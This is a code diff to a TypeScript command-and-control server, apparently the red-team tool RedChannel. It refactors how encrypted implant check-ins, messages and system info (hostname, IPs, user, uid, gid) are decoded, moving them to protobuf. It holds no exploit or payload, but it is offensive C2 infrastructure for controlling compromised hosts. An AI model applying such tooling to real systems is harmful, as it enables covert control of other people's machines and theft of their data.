@@ -93,6 +93,7 @@ export enum AgentStatus {
     ERROR_AGENT_UNKNOWN = "09",
     ERROR_CHECKING_IN = "0a",
     ERROR_KEYX_NOT_ALLOWED = "0b",
+    ERROR_INVALID_SYSINFO = "0C",
     ERROR_FAILED = "0f",
 }
 
@@ -619,13 +620,14 @@ export default class RedChannel {
     checkInAgent(agent: AgentModel, hostname: string, checkInPayload: string): C2Answer[] | void {
         const agentId = agent.id;
 
-        let plaintext = "";
+        let agentData = "";
         try {
-            plaintext = this.decryptAgentData(agentId, checkInPayload);
+            const agentCommandResponseProto = this.decryptAgentData(agentId, checkInPayload);
+            if (agentCommandResponseProto) agentData = Buffer.from(agentCommandResponseProto.output).toString();
         } catch (ex) {
             throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
         }
-        if (!plaintext) {
+        if (!agentData) {
             throw new Error(`checkin payload is invalid for ${agentId}`);
         }
 
@@ -678,7 +680,6 @@ export default class RedChannel {
             ];
         }
 
-        let plaintext = "";
         switch (command) {
             // checkin should be authenticated (decrypt dummy data) or rogue agents can drain the queue for legitimate ones
             case implant.AgentCommand.AGENT_CHECKIN:
@@ -723,7 +724,7 @@ export default class RedChannel {
                     try {
                         this.crypto.generateKeys();
                     } catch (ex) {
-                        this.log.error(`failed to generate keys: ${emsg(ex)}`);
+                        this.log.error(`${emsg(ex)}`);
                         return [
                             {
                                 name: hostname,
@@ -770,8 +771,10 @@ export default class RedChannel {
                 if (!this.isCommandInSendQ(agentId, implant.AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
                 break;
             case implant.AgentCommand.AGENT_MESSAGE:
+                let agentMessage = "";
                 try {
-                    plaintext = this.decryptAgentData(agentId, data);
+                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
+                    if (agentCommandResponseProto) agentMessage = Buffer.from(agentCommandResponseProto.output).toString();
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                     return [
@@ -783,13 +786,17 @@ export default class RedChannel {
                         },
                     ];
                 }
-                this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
+                this.log.success(`agent(${agentId}) output>\n ${agentMessage}`);
                 break;
             case implant.AgentCommand.AGENT_SYSINFO:
+                let sysInfo: implant.SysInfoData = implant.SysInfoData.create({});
                 try {
-                    plaintext = this.decryptAgentData(agentId, data);
+                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
+                    if (agentCommandResponseProto && agentCommandResponseProto.sysinfo) {
+                        sysInfo = implant.SysInfoData.create(agentCommandResponseProto.sysinfo);
+                    }
                 } catch (ex) {
-                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
+                    this.log.error(`cannot decrypt sysinfo from ${agentId}: ${emsg(ex)}`);
                     return [
                         {
                             name: hostname,
@@ -800,37 +807,23 @@ export default class RedChannel {
                     ];
                 }
 
-                const sysInfo = plaintext.split(";");
-                if (sysInfo.length < 3) {
-                    this.log.error(`invalid sysinfo from ${agentId}: ${plaintext}`);
+                if (!sysInfo.hostname) {
                     return [
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(AgentStatus.ERROR_INVALID_MESSAGE),
+                            data: this.makeIpString(AgentStatus.ERROR_INVALID_SYSINFO),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
                 }
 
-                const userInfo = sysInfo[2].split(":");
-                if (userInfo.length < 3) {
-                    this.log.error(`invalid sysinfo:userinfo from ${agentId}: ${plaintext}`);
-                    return [
-                        {
-                            name: hostname,
-                            type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(AgentStatus.ERROR_INVALID_MESSAGE),
-                            ttl: Config.C2_ANSWER_TTL_SECS,
-                        },
-                    ];
-                }
                 const displayRows = [
-                    ["hostname", sysInfo[0]],
-                    ["ips", sysInfo[1]],
-                    ["user", userInfo[0]],
-                    ["uid", userInfo[1]],
-                    ["gid", userInfo[2]],
+                    ["hostname", sysInfo.hostname],
+                    ["ips", sysInfo.ip.join(",")],
+                    ["user", sysInfo.user],
+                    ["uid", sysInfo.uid],
+                    ["gid", sysInfo.gid],
                 ];
 
                 this.log.success(`agent(${agentId}) sysinfo>`);
@@ -853,12 +846,12 @@ export default class RedChannel {
         return Buffer.concat([cipher.iv, cipher.data]);
     }
 
-    decryptAgentData(agentId: string, data: string) {
+    decryptAgentData(agentId: string, data: string): implant.Command.Response | void {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
         if (!agent.keyx) throw new Error("missing keyx");
-        if (!agent.secret) throw new Error("missing agent secret, do you need to 'keyx'?");
+        if (!agent.secret || agent.secret.length === 0) throw new Error("missing agent secret, do you need to 'keyx'?");
 
         const dataBuffer = Buffer.from(data, "hex");
         const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
@@ -866,6 +859,12 @@ export default class RedChannel {
 
         // may throw errors
         const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
-        return plaintext.toString();
+
+        try {
+            const commandProto = implant.Command.Response.decode(plaintext);
+            return commandProto;
+        } catch (ex) {
+            throw new Error(`failed to decode proto: ${emsg(ex)}`);
+        }
     }
 }
